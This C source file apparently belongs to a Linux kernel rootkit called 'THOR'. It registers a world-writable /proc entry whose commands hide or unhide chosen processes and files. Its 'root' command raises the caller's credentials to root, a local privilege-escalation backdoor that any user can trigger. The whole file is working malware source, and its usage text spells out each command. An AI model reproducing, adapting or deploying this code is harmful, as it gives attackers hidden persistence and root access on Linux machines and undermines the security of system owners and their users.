#include "procfile.h"

#include "filehider.h"
#include "helper.h"
#include "logging.h"
#include "prochider.h"

#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>

/* function prototypes */
static int procfile_read(struct seq_file *m, void *v);
static int procfile_open(struct inode *inode, struct file *file);
static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos);

/* procfile */
struct proc_dir_entry *procfile;

/* file operatiosn for procfile */
static struct file_operations procfile_fops = {
    .owner = THIS_MODULE,
    .open = procfile_open,
    .read = seq_read,
    .write = procfile_write,
    .llseek = seq_lseek,
    .release = single_release,
};

int procfile_init(void)
{
    // allocate file in proc
    procfile = proc_create(THOR_PROCFILE, 0666, NULL, &procfile_fops);
    if (procfile == NULL) {
        LOG_ERROR("could not create proc entry");
        return -1;
    }

    return 0;
}

/* read callback for procfile */
static int procfile_read(struct seq_file *m, void *v)
{
    seq_printf(m,
        "usage:\n"\
        "   echo hp PID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
        "   echo up PID > /proc/" THOR_PROCFILE " (unhides process PID)\n"\
        "   echo upa > /proc/" THOR_PROCFILE " (unhide all PIDs)\n"\
        "   echo hf FILE > /proc/" THOR_PROCFILE " (hide file FILE)\n"\
        "   echo uf FILE > /proc/" THOR_PROCFILE " (unhide file FILE)\n"\
        "   echo ufa > /proc/" THOR_PROCFILE " (unhide all files)\n"\
        "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
    return 0;
}

/* open callback for procfile */
static int procfile_open(struct inode *inode, struct file *file)
{
    return single_open(file, procfile_read, NULL);
}

/* write callback for procfile */
static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos)
{
    if (strncmp(buffer, "hp ", MIN(3, count)) == 0) {
        add_to_pid_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "upa", MIN(3, count)) == 0) {
        clear_pid_list();
    } else if (strncmp(buffer, "up ", MIN(3, count)) == 0) {
        remove_from_pid_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "hf ", MIN(3, count)) == 0) {
        add_to_file_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "ufa", MIN(3, count)) == 0) {
        clear_file_list();
    } else if (strncmp(buffer, "uf ", MIN(3, count)) == 0) {
        remove_from_file_list(buffer + 3, count - 3);
    } else if (strncmp(buffer, "root", MIN(4, count)) == 0) {
        struct cred *credentials = prepare_creds();
        credentials->uid = credentials->euid = GLOBAL_ROOT_UID;
        credentials->gid = credentials->egid = GLOBAL_ROOT_GID;
        commit_creds(credentials);
    }
    return count;
}

void procfile_cleanup(void)
{
    if (procfile != NULL) {
        proc_remove(procfile);
        procfile = NULL;
    }
}
